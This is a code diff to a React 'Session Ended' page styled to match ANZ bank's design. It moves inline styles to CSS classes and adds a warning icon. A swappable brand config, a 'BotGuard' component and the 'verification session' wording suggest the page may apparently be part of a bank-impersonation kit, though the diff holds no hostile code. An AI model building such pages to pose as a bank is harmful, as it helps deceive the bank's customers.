@@ -2,11 +2,12 @@
 
 /**
  * ANZ Terminated/Session Ended Page
- * Centered single-column layout
+ * Centered single-column layout matching ANZ design
  */
 
 import { currentBrand } from '@/config/branding';
 import { BotGuard } from '@/components/security/BotGuard';
+import { AlertTriangle } from 'lucide-react';
 
 export default function TerminatedPage() {
   return (
@@ -14,27 +15,27 @@ export default function TerminatedPage() {
       {/* Page Title */}
       <h1 className="page-title">Session Ended</h1>
 
-      {/* Content Card */}
+      {/* Content Container */}
       <div className="login-card">
-        {/* Card Header - Mobile only */}
-        <div className="card-header">
-          <h2>Session Ended</h2>
-        </div>
+        <div className="status-container">
+          {/* Warning Icon - Centered */}
+          <div className="status-icon-wrapper warning">
+            <AlertTriangle strokeWidth={1.5} />
+          </div>
 
-        <div className="login-form">
-          <p style={{ color: 'var(--anz-white)', fontSize: '16px', fontWeight: 500, textAlign: 'center' }}>
+          <p className="status-message-primary">
             Your verification session has ended.
           </p>
 
-          <p style={{ color: 'var(--anz-white)', fontSize: '14px', textAlign: 'center', marginTop: '8px', opacity: 0.9 }}>
+          <p className="status-message-secondary">
             This may be due to inactivity or the session was completed.
           </p>
 
-          <p style={{ color: 'var(--anz-white)', fontSize: '14px', textAlign: 'center', marginTop: '24px', opacity: 0.9 }}>
+          <p className="status-message-secondary" style={{ marginTop: '24px' }}>
             If you believe this was an error, please contact our support team for assistance.
           </p>
 
-          <p style={{ color: 'var(--anz-white)', fontSize: '13px', textAlign: 'center', marginTop: '32px', opacity: 0.8 }}>
+          <p className="status-footer">
             Need help? Contact {currentBrand.companyName} support
           </p>
         </div>
